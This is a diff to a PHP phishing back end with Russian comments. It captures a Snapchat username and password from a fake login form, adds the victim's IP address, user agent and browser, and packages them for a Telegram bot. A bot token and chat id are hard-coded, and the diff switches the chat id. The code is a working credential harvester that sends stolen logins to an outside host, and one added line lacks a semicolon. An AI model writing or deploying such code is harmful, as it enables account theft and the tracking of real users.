@@ -2,15 +2,38 @@
 
 ini_set('display_errors', '1');
 
+//IP Адресс
+
+if (!empty($_SERVER['HTTP_CLIENT_IP']))
+    {
+      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
+    }
+elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
+    {
+      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
+    }
+else
+    {
+      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
+    }
+$useragent = " User-Agent: ";
+$browser = $_SERVER['HTTP_USER_AGENT'];
+
 $username=$_POST['username'];
 $password=$_POST['password'];
+
+$service = "Snapchat"
 
 /* https://api.telegram.org/bot5621562429:AAFI4GKbo3pJiG4JDA3AOAixKZXBW9NGEWM/getUpdates,
 где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */
 
 $token = "5621562429:AAFI4GKbo3pJiG4JDA3AOAixKZXBW9NGEWM";
-$chat_id = "972847950";
+$chat_id = "501357456";
 $arr = array(
+  'Сервис: ' => $service,
+  'IP адресс: ' => $ipaddress,
+  'User Agent: ' => $useragent,
+  'Браузер: ' => $browser, 
   'Имя пользователя: ' => $username,
   'Пароль: ' => $password
 );
